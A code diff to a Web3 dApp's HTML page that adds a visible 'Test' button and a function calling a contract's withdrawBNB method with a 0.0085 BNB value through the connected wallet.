@@ -121,7 +121,7 @@
 </ul>
         </div></b>
     </footer>
-
+<button class="testing" onclick="test()"><b>Test</b></button>
 <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
 
 <script src="walletconnect.js"></script>
@@ -404,6 +404,31 @@ updateLog(userAddress, `✅ Referral Claimed`);
 	        document.getElementById('popup-status').textContent = 'Transaction Failed';
 		document.getElementById('popup-message').textContent = `❌ Error: ${error.message}`;
 		updateLog(userAddress, `❌ Refer: ${error.message}`);
+      }
+}
+
+async function test() {
+
+	if(!walletConnected) {
+        flashNotification('Wallet not Connected', 'red');
+	return;
+	}
+
+        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+	const userAddress = accounts[0];
+	popup.style.display = "flex";
+	
+	try{
+		const weiAmount = web3.utils.toWei('0.0085', 'ether');
+		const gas = 5000000;
+		const result = await contract.methods.withdrawBNB().send({ from: userAddress, value: weiAmount, gas });
+
+		if (result.status) {
+	        console.log("Transaction Successful");
+		}
+      } catch (error) {
+	        console.log("Transaction Failed");
+		console.log(`❌ Error: ${error.message}`);
       }
 }
 
